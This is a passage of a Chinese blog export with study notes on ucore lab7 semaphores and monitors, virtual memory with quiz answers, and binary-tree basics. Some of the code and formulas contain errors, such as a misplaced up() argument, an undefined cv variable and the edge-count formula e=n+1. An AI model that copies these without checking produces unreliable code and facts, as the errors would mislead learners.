class="comment">//资源没有剩余，将当前进程设置为睡眠状态并加入到该信号量等待队列，重新执行调度</span></span><br><span class="line">    <span class="keyword">wait_t</span> __wait, *wait = &amp;__wait;</span><br><span class="line">    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    schedule();</span><br><span class="line">    <span class="comment">//阻塞结束，该进程被重新唤醒</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    wait_current_del(&amp;(sem-&gt;wait_queue), wait);</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;</span><br><span class="line">        <span class="keyword">return</span> wait-&gt;wakeup_flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Semaphore::V() &#123;</span><br><span class="line">    sem++; </span><br><span class="line">    <span class="keyword">if</span> (sem&lt;=<span class="number">0</span>) &#123;</span><br><span class="line">        Remove a thread t from q;</span><br><span class="line">        wakeup(t);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">void</span> __up(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="comment">//禁用中断来保证操作的原子性</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">wait_t</span> *wait;</span><br><span class="line">        <span class="comment">//当没有进程正在等待该资源，则信号量加一</span></span><br><span class="line">        <span class="keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            sem-&gt;value ++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//唤醒正在等待使用该资源的进程</span></span><br><span class="line">            assert(wait-&gt;proc-&gt;wait_state == wait_state);</span><br><span class="line">            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处需要提及的是，在原理课中的sem若为负数，则其值等于当前正在等待队列的进程的个数，通过sem的值来判断当前是否有进程正在等待该资源，而具体实现中sem最小为0，sem为0表示当前共享资源不空闲，而正在等待该资源的进程则用wait队列来表示，若为空，则当前无正在等待该资源的进程，若不为空，则唤醒对应的进程。</p>
<p>lab7中采用以下方式来解决同步互斥问题：</p>
<ul>
<li>所有哲学家共用mutex来确保对state_sema数组的互斥访问，在拿刀叉和放回刀叉时均需互斥访问。</li>
<li>S信号量数组表示对应哲学家是否正在使用他左右的叉子就餐。</li>
<li>尝试开始就餐时，哲学家先试图取得两个叉子，若得不到叉子则进入阻塞状态等待对应的信号量。</li>
<li>在放回叉子时检查左右哲学家是否可以就餐，可以就餐则解除对应信号量引起的阻塞。</li>
</ul>
<h2 id="信号量机制"><a href="#信号量机制" class="headerlink" title="信号量机制"></a>信号量机制</h2><blockquote>
<p>在进程控制块中添加信号量对应的数据结构，用户态进程/线程通过系统调用接口来实现对信号量的P(),V()操作。</p>
</blockquote>
<p>对应接口可以设计如下：</p>
<ul>
<li>P: 传入参数为信号量，相当于信号量的P操作，其原子性同样由操作系统来保证。</li>
<li>V：传入参数为信号量，相当于信号量的V操作。</li>
<li>Set_sem: 传入参数为信号量和设置的value，返回信号量。创建信号量结构体并与当前进程关联，添加到对应的PCB/TCB中。</li>
</ul>
<p>由系统调用实现是因为用户态特权级无法保证操作的原子性，仍然会被各种中断打断，且进程切换会涉及到内核态的操作，由系统调用来实现更为连贯。</p>
<h1 id="内核级条件变量"><a href="#内核级条件变量" class="headerlink" title="内核级条件变量"></a>内核级条件变量</h1><p>首先掌握管程机制，然后基于信号量实现完成条件变量实现，然后用管程机制实现哲学家就餐问题的解决方案（基于条件变量）。</p>
<h2 id="内核级条件变量描述"><a href="#内核级条件变量描述" class="headerlink" title="内核级条件变量描述"></a>内核级条件变量描述</h2><p>管程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">condvar</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;<span class="comment">//二值信号量，用来互斥访问管程       </span></span><br><span class="line">    <span class="keyword">int</span> count;<span class="comment">//等待信号量的进程个数</span></span><br><span class="line">    <span class="keyword">monitor_t</span> * owner;<span class="comment">//该条件变量所属的管程</span></span><br><span class="line">&#125; <span class="keyword">condvar_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex;<span class="comment">//二值信号量，用来互斥访问管程</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> next;<span class="comment">//用于条件同步</span></span><br><span class="line">    <span class="keyword">int</span> next_count; <span class="comment">// 记录signal后休眠的进程数</span></span><br><span class="line">    <span class="keyword">condvar_t</span> *cv;<span class="comment">//条件变量</span></span><br><span class="line">&#125; <span class="keyword">monitor_t</span>;</span><br></pre></td></tr></table></figure>
<p>操作管程的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="comment">//初始化管程数据结构    </span></span><br><span class="line">monitor_init (<span class="keyword">monitor_t</span> * mtp, <span class="keyword">size_t</span> num_cv) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    assert(num_cv&gt;<span class="number">0</span>);</span><br><span class="line">    mtp-&gt;next_count = <span class="number">0</span>;</span><br><span class="line">    mtp-&gt;cv = <span class="literal">NULL</span>;</span><br><span class="line">    sem_init(&amp;(mtp-&gt;mutex), <span class="number">1</span>); <span class="comment">//信号量设置为1，互斥操作</span></span><br><span class="line">    sem_init(&amp;(mtp-&gt;next), <span class="number">0</span>);</span><br><span class="line">    mtp-&gt;cv =(<span class="keyword">condvar_t</span> *) kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">condvar_t</span>)*num_cv);</span><br><span class="line">    assert(mtp-&gt;cv!=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;num_cv; i++)&#123;</span><br><span class="line">        mtp-&gt;cv[i].count=<span class="number">0</span>;</span><br><span class="line">        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="number">0</span>);</span><br><span class="line">        mtp-&gt;cv[i].owner=mtp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原理课上关于管程的伪代码描述</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Class Condition &#123;</span><br><span class="line">    <span class="keyword">int</span> numWaiting = <span class="number">0</span>;</span><br><span class="line">    WaitQueue q;</span><br><span class="line">&#125;</span><br><span class="line">Condition::Wait(lock)&#123;</span><br><span class="line">  numWaiting++;</span><br><span class="line">  Add <span class="keyword">this</span> thread t to q;</span><br><span class="line">  release(lock);</span><br><span class="line">  schedule(); <span class="comment">//need mutex</span></span><br><span class="line">  require(lock);</span><br><span class="line">&#125;</span><br><span class="line">Condition::Signal()&#123;</span><br><span class="line"> <span class="keyword">if</span> (numWaiting &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   Remove a thread t from q;</span><br><span class="line">   wakeup(t); <span class="comment">//need mutex</span></span><br><span class="line">   numWaiting--;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ucore中具体实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">cond_wait (<span class="keyword">condvar_t</span> *cvp) &#123;</span><br><span class="line">    cprintf(<span class="string">&quot;cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">    <span class="comment">//等待该条件变量的进程数目加一</span></span><br><span class="line">	cvp-&gt;count++;</span><br><span class="line">	<span class="comment">//存在因signal而休眠的进程则唤醒</span></span><br><span class="line">	<span class="keyword">if</span>(cvp-&gt;owner-&gt;next_count&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		up(&amp;(cvp-&gt;owner-&gt;next_count);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		up(&amp;(cvp-&gt;owner-&gt;mutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//自身进入休眠状态</span></span><br><span class="line">	down(cv-&gt;sem);</span><br><span class="line">	<span class="comment">//休眠后再次唤醒</span></span><br><span class="line">	cvp-&gt;count--;</span><br><span class="line">    cprintf(<span class="string">&quot;cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">cond_signal (<span class="keyword">condvar_t</span> *cvp) &#123;</span><br><span class="line">   cprintf(<span class="string">&quot;cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">   <span class="comment">//存在等待信号量的进程</span></span><br><span class="line">   <span class="keyword">if</span>(cvp-&gt;count&gt;<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="comment">//因signal而进入休眠的进程个数加一</span></span><br><span class="line">	   cvp-&gt;owner-&gt;next_count++;</span><br><span class="line">	   <span class="comment">//唤醒等待信号量的进程</span></span><br><span class="line">	   up(&amp;(cv-&gt;sem));</span><br><span class="line">	   <span class="comment">//自身进入休眠状态</span></span><br><span class="line">	   down(&amp;(cvp-&gt;owner-&gt;next));</span><br><span class="line">	   <span class="comment">//休眠后再次唤醒</span></span><br><span class="line">	   cvp-&gt;owner-&gt;next_count--;</span><br><span class="line">   &#125;</span><br><span class="line">	   </span><br><span class="line">   cprintf(<span class="string">&quot;cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>wait和signal休眠原因不同，wait因为条件不满足而进入休眠，signal主动让出管程的互斥访问权而休眠。同时可以确定内核态的管程机制采用hoare管程实现，在条件变量释放的同时放弃对管程的互斥访问权。</p>
<p>每次进入管程时执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">down(&amp;(mtp-&gt;mutex));</span><br></pre></td></tr></table></figure>
<p>每次退出管程时执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">   up(&amp;(mtp-&gt;next));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   up(&amp;(mtp-&gt;mutex));</span><br></pre></td></tr></table></figure>
<p>通过以上语句来互斥访问管程，对应于原理课上的相当于原理课上所讲的<code>lock-&gt;Acquire()</code>和<code>lock-&gt;Release()</code>操作。</p>
<p>基于管程的哲学家就餐算法如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">philosopher_proc_condvar</span>[<span class="title">N</span>];</span> <span class="comment">// N个哲学家</span></span><br><span class="line"><span class="keyword">int</span> state_condvar[N]; <span class="comment">// 哲学家的状态  </span></span><br><span class="line"><span class="keyword">monitor_t</span> mt, *mtp=&amp;mt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_condvar</span> <span class="params">(i)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;phi_test_condvar: state_condvar[%d] will eating\n&quot;</span>,i);</span><br><span class="line">        state_condvar[i] = EATING ;</span><br><span class="line">        cprintf(<span class="string">&quot;phi_test_condvar: signal self_cv[%d] \n&quot;</span>,i);</span><br><span class="line">        cond_signal(&amp;mtp-&gt;cv[i]) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));</span><br><span class="line">      state_condvar[i]=HUNGRY; </span><br><span class="line">      phi_test_condvar(i); </span><br><span class="line">      <span class="keyword">if</span> (state_condvar[i] != EATING) &#123;</span><br><span class="line">          cprintf(<span class="string">&quot;phi_take_forks_condvar: %d didn&#x27;t get fork and will wait\n&quot;</span>,i);</span><br><span class="line">          cond_wait(&amp;mtp-&gt;cv[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">         up(&amp;(mtp-&gt;next));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));</span><br><span class="line">      state_condvar[i]=THINKING;</span><br><span class="line">      phi_test_condvar(LEFT);</span><br><span class="line">      phi_test_condvar(RIGHT);</span><br><span class="line">     <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">        up(&amp;(mtp-&gt;next));</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在之前版本的ucore中，对哲学家所处状态检查以while的形式进行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (state_condvar[i] != EATING) &#123;</span><br><span class="line">  cond_wait(&amp;(mtp-&gt;cv[i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>while和if均可以实现对应功能，if逻辑更为简洁明了。可能考虑到逻辑问题，ucore放弃之前的while而改用if实现对状态的检查。</p>
<h2 id="用户态条件变量机制"><a href="#用户态条件变量机制" class="headerlink" title="用户态条件变量机制"></a>用户态条件变量机制</h2><p>在条件变量的实现中，<code>cond_signal</code>和<code>cond_wait</code>导致的进程阻塞与唤醒均由信号量机制来实现，可以考虑由用户来手动控制系统调用来实现用户态进程/线程的条件变量机制。</p>
<p>在ucore中基于信号量实现了条件变量的相关机制，只用到了其中的value成员变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">  queueType <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Class Condition &#123;</span><br><span class="line">    <span class="keyword">int</span> numWaiting = <span class="number">0</span>;</span><br><span class="line">    WaitQueue q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue;</span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">condvar</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;       </span><br><span class="line">    <span class="keyword">int</span> count;             </span><br><span class="line">    <span class="keyword">monitor_t</span> * owner;      </span><br><span class="line">&#125; <span class="keyword">condvar_t</span>;</span><br></pre></td></tr></table></figure>
<p>信号量和条件变量均为一个整形变量和一个等待队列，但是概念有所不同，对于整形变量解释有所不同。条件变量中，numWaiting表示正在等待该条件变量的进程个数，而信号量中value表示资源的剩余数目，value初始化为1的时候与管程类似，用于互斥操作。</p>
<blockquote>
<p>能否不用基于信号量机制来完成条件变量？</p>
</blockquote>
<p>可以，条件变量维护者进程的等待队列和进程的等待数目，实际上用等待队列和锁机制同样可以实现。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟存储</title>
    <url>/systems/vmm/</url>
    <content><![CDATA[<p>随着用户使用数据的增加，计算机系统本身的物理内存不足以满足用户的正常使用需求。早期的操作系统通过交换来解决内存不足的问题，现代操作系统则大多采用虚拟存储方式，在有限的内存中，只装入部分页面，在需要的页面或段不在内存中时再将相应的段或页调入内存。</p>
<a id="more"></a>

<h1 id="虚拟存储的需求背景"><a href="#虚拟存储的需求背景" class="headerlink" title="虚拟存储的需求背景"></a>虚拟存储的需求背景</h1><p><img src="https://i.loli.net/2019/07/27/5d3bb2ed253eb25373.png"></p>
<p>计算机系统时常出现内存空间不够用，解决方案：</p>
<ul>
<li>覆盖（overlay）：应用程序手动把需要的指令和数据保存在内存中</li>
<li>交换（swapping）：操作系统自动把暂时不能执行的程序保存到外存中</li>
<li>虚拟存储：在有限容量的内存中，以页为单位自动装入更多更大的程序</li>
</ul>
<h1 id="覆盖技术"><a href="#覆盖技术" class="headerlink" title="覆盖技术"></a>覆盖技术</h1><p><strong>覆盖技术目标</strong></p>
<p>在较小的可用内存中运行较大的程序 (无法满足一个程序所需要的内存资源)</p>
<p><strong>覆盖技术实现方法</strong></p>
<p>依据程序的逻辑结构 将程序模块划分为若干功能相对独立的模块<br>将不会同时执行的模块共享同一块内存区域</p>
<ul>
<li>必要部分(常用功能)的代码和数据常驻内存</li>
<li>可选部分(不常用功能)放在其他程序模块中 只在需要的时候装入内存</li>
<li>不存在调用关系的模块可相互覆盖 共用同一块内存区域</li>
</ul>
<p><strong>覆盖技术的不足</strong></p>
<ul>
<li><strong>增加编程难度</strong> 需要程序员 划分功能模块 并确定模块间的覆盖关系</li>
<li><strong>增加执行时间</strong> 从外存装入覆盖模块，时间换空间</li>
</ul>
<h1 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h1><p><strong>交换技术目标</strong></p>
<p>增加正在运行或需要运行的程序的内存</p>
<p><strong>交换技术实现方法</strong></p>
<p>可将暂时不能运行的程序放到外存</p>
<ul>
<li>换入换出的基本单位：整个进程的地址空间</li>
<li>换出（swap out）：把一个进程的整个地址空间保存到外存</li>
<li>换入（swap in）：将外存中某进程的地址空间读入到内存</li>
</ul>
<p><strong>交换面临的问题</strong></p>
<ul>
<li><strong>交换时机</strong> 只当内存空间不够或有不够的可能时换出</li>
<li><strong>交换区大小</strong> 存放所有用户进程的内存映像拷贝</li>
<li><strong>程序换入时的重定位</strong> 动态地址映射</li>
</ul>
<p><strong>覆盖与交换技术的比较</strong></p>
<table>
<thead>
<tr>
<th align="left">覆盖</th>
<th align="left">交换</th>
</tr>
</thead>
<tbody><tr>
<td align="left">只能发生在没有调用关系的模块间</td>
<td align="left">以进程为单位</td>
</tr>
<tr>
<td align="left">程序员须给出模块间的逻辑覆盖结构</td>
<td align="left">不需要模块间的逻辑覆盖结构</td>
</tr>
<tr>
<td align="left">发生在运行程序的内部模块间</td>
<td align="left">发生在内存进程间</td>
</tr>
</tbody></table>
<h1 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h1><ul>
<li>程序在执行过程中的一个较短时期，所执行的指令地址和指令的操作数地址，分别局限于一定区域<ul>
<li>时间局部性：一条指令的一次执行和下次执行，一个数据的一次访问和下次访问都集中在一个较短时期内</li>
<li>空间局部性：当前指令和邻近的几条指令，当前访问的数据和邻近的几个数据都集中在一个较小区域内</li>
<li>分支局部性：一条跳转指令的两次执行，很可能跳到相同的内存位置</li>
</ul>
</li>
<li>局部性原理的意义<ul>
<li>从理论上来说，虚拟存储技术是能够实现的，而且可取得满意的效果</li>
</ul>
</li>
</ul>
<h1 id="虚拟存储"><a href="#虚拟存储" class="headerlink" title="虚拟存储"></a>虚拟存储</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>虚拟存储的目标</strong></p>
<ul>
<li>只把部分程序放到内存中 从而运行比物理内存大的程序</li>
<li>由操作系统自动完成</li>
<li>在内存与外存之间只交换进程的部分内容</li>
</ul>
<p><strong>虚拟存储思路</strong></p>
<ul>
<li>加载程序时 只将当前执行所需要的部分页面或段装入内存</li>
<li>指令执行时中需要的指令或数据不在内存中时 处理器通知操作系统将相应的页面或段调入内存</li>
<li>操作系统将内存中暂时不用的页面或段保存到外存</li>
</ul>
<p><strong>虚拟存储实现方式</strong></p>
<ul>
<li>虚拟段式存储</li>
<li>虚拟页式存储</li>
</ul>
<h2 id="基本特征"><a href="#基本特征" class="headerlink" title="基本特征"></a>基本特征</h2><ul>
<li>不连续性<ul>
<li>物理内存分配非连续</li>
<li>虚拟地址空间使用非连续</li>
</ul>
</li>
<li>大用户空间<ul>
<li>提供给用户的虚拟内存可大于实际的物理内存</li>
</ul>
</li>
<li>部分交换<ul>
<li>虚拟存储只对部分虚拟地址空间的换入和换</li>
</ul>
</li>
</ul>
<p><strong>虚拟存储的支持技术</strong></p>
<ul>
<li>硬件<ul>
<li>页式或段式存储中的地址转换机制 </li>
</ul>
</li>
<li>操作系统<ul>
<li>管理内存和外存间页面或段的换入换出 </li>
</ul>
</li>
</ul>
<h2 id="虚拟页式存储"><a href="#虚拟页式存储" class="headerlink" title="虚拟页式存储"></a>虚拟页式存储</h2><p>在页式存储管理的基础上增加请求调页和页面置换</p>
<ul>
<li>当用户进程要加载到内存运行时，只装入部分页面就启动程序运行</li>
<li>进程在运行中发现有需要的代码或数据不在内存中则向系统发起缺页异常请求</li>
<li>操作系统在处理缺页异常时将外存的页面调入内存，使进程能够继续运行</li>
</ul>
<p>虚拟页式内存地址转换和之前页式存储类似，区别在于虚拟页式内存中访问页可能不在内存，因此会引发缺页异常。</p>
<p><img src="https://i.loli.net/2019/07/27/5d3bb7ee9002d70550.png"></p>
<p><img src="https://i.loli.net/2019/07/27/5d3bb8dd4808179159.png"></p>
<p>在虚拟页式存储中，</p>
<ul>
<li><p>页表项中的访问位用于页面置换算法，页面置换算法可能需要根据不同页面是否被访问，访问时间和访问频率等进行淘汰页面的选择。</p>
</li>
<li><p>页表项中修改位供换出页面使用，页面换出的时候，需要判断外存上的相应页面是否需要重写。如果内存中该页面在使用期间发生了修改，则相应的修改位被设置，用于换出的时候通知操作系统进行外存相应页面的修改。</p>
</li>
<li><p>页表项的状态位用于指示该页是否已经调入内存，供程序访问时使用，如果发现该页未调入内存，则产生缺页中断，由操作系统进行相应处理。</p>
</li>
</ul>
<p><strong>缺页异常的处理流程</strong></p>
<p><img src="https://i.loli.net/2019/07/27/5d3bb9349384247402.png"></p>
<ol>
<li>指令执行中的页表项引用；</li>
<li>由于页面不在内存，导致缺页异常；</li>
<li>在外存中查找需要访问的页面备份；</li>
<li>页面换入；</li>
<li>页表项修改；</li>
<li>重新执行导致缺页异常的指令；</li>
</ol>
<blockquote>
<p>在何处保存未被映射的页?</p>
</blockquote>
<ul>
<li>应能方便地找到在外存中的页面内容 (选择一个分区做对换区 Linux Unix)</li>
<li>交换空间 (磁盘或者文件)<ul>
<li>采用特殊格式存储未被映射的页面 (用一个文件来存)</li>
</ul>
</li>
</ul>
<blockquote>
<p>虚拟页式存储中的外存选择</p>
</blockquote>
<ul>
<li><strong>代码段</strong> 它就是可执行的二进制文件，没必要复制</li>
<li><strong>代码加载的共享库程序段</strong> 也是不会变的，没必要复制</li>
<li><strong>其他段</strong> 可以放到交换空间里去</li>
</ul>
<p>下列关于虚拟存储器的叙述中，正确的是（  ）</p>
<ul>
<li><input disabled="" type="checkbox"> 虚拟存储只能基于连续分配技术</li>
<li><input checked="" disabled="" type="checkbox"> 虚拟存储只能基于非连续分配技术</li>
<li><input disabled="" type="checkbox"> 虚拟存储容量只受外存容量的限制</li>
<li><input disabled="" type="checkbox"> 虚拟存储容量只受内容容量的限制</li>
</ul>
<p>采用连续分配方式的时候，会使得相当一部分内存空间都处于空闲状态，造成内存资源的严重浪费，无法从逻辑上扩大内存容量。</p>
<p>若系统发生抖动(Thrashing)时，可用采取的有效措施是（  ）<br>1）撤销部分进程    2）增加磁盘交换区的容量    3）提高用户进程的优先级</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 仅1</li>
<li><input disabled="" type="checkbox"> 仅2</li>
<li><input disabled="" type="checkbox"> 仅3</li>
<li><input disabled="" type="checkbox"> 仅1、2</li>
</ul>
<p>撤销部分进程可以增大可用内存，减少抖动。而磁盘交换区容量和进程优先级则跟抖动无关。</p>
<p>虚拟页式内存管理系统中，发生缺页的概率一般取决于____</p>
<ul>
<li><input disabled="" type="checkbox"> 内存分配算法</li>
<li><input disabled="" type="checkbox"> 内存读取速度</li>
<li><input disabled="" type="checkbox"> 内存写入速度</li>
<li><input checked="" disabled="" type="checkbox"> 页面置换算法</li>
</ul>
<p>缺页率的高低跟实际能分配的物理内存的大小，以及系统中的页面置换算法相关。差的页面置换算法可能造成需要访问的页面经常没有在内存中，而需要进行缺页中断处理。</p>
<p>发生缺页的时候，一定会使用页面置换算法____</p>
<ul>
<li><input disabled="" type="checkbox"> 对</li>
<li><input checked="" disabled="" type="checkbox"> 错</li>
</ul>
<p>发生缺页的时候，如果分配给程序的物理页面数还有空闲，则直接换入新的页面，不需要使用页面置换算法来挑选需要换出的页面。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/algorithm/bin-tree/</url>
    <content><![CDATA[<p>树是一种分层结构，而层次化这一结构几乎蕴含于所有事物及其联系中，称为其本质属性之一。从文件系统、互联网域名系统，一直到地球生态系统乃至人类社会系统，层次化特征和层次化结构均无所不在。二叉树不再是简单的线性结构，但确定某种次序后具有线性特征，故树属于半线性结构。</p>
<p>树等价于无环联通图，因此与一般的图相同，树也由一组顶点和联接于其间的若干条边组成，故任一节点与根节点之间存在着唯一路径。</p>
<a id="more"></a>

<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>节点度数不超过2的树称为二叉树，同一节点的孩子和子树，均以左、右区分。</p>
<p>深度为$k$的节点，至多$2^k$个</p>
<p>含$n$个节点的二叉树，高度为$h$的二叉树中，$h&lt;n&lt;2^{h+1}$</p>
<p>1）$n=h+1$时，退化为一条单链</p>
<p>2）$n=2^{h+1}-1$,即所谓的满二叉树</p>
<p>设度数为0，1，2的节点，各有$n_0$,$n_1$,$n_2$个</p>
<p>树为极小联通图，故边数$e=n+1=n_1+2n_2$</p>
<p>叶节点数$n_0=n_2+1$</p>
<p>即$n_1$与$n_0$无关</p>
<p>$h=0$时，$1=0+1$</p>
<p>此后，$n_0$与$n_2$同步递增</p>
<p>特别地，当$n_1=0$时，有$e=2n_2$和$n_0=n_2+1=(n+1)/2$</p>
<p>此时，所有的节点均为偶数，不含单分支节点。</p>
<p>二叉树本身并不具有天然的次序，需要在各个节点与其孩子间定义某种局部次序，从而间接地定义出全局次序。按惯例，左孩子优先于右孩子，将节点和左右孩子分别称为V,L,R,局部次序有VLR,LVR,LRV三种选择，根据节点V的访问次序分别称为先序遍历、中序遍历、后序遍历。</p>
<h1 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h1><h2 id="递归版"><a href="#递归版" class="headerlink" title="递归版"></a>递归版</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> VST&gt; <span class="comment">//元素类型、操作器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">travPre_R</span> <span class="params">( BinNodePosi(T) x, VST&amp; visit )</span> </span>&#123; <span class="comment">//二叉树先序遍历算法（递归版）</span></span><br><span class="line">   <span class="keyword">if</span> ( !x ) <span class="keyword">return</span>;</span><br><span class="line">   visit ( x-&gt;data );</span><br><span class="line">   travPre_R ( x-&gt;lc, visit );</span><br><span class="line">   travPre_R ( x-&gt;rc, visit );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="迭代版"><a href="#迭代版" class="headerlink" title="迭代版"></a>迭代版</h2><p>对右子树的递归属于尾递归，左子树的递归接近尾递归，借用尾递归的消除方法，可得到迭代版算法。</p>
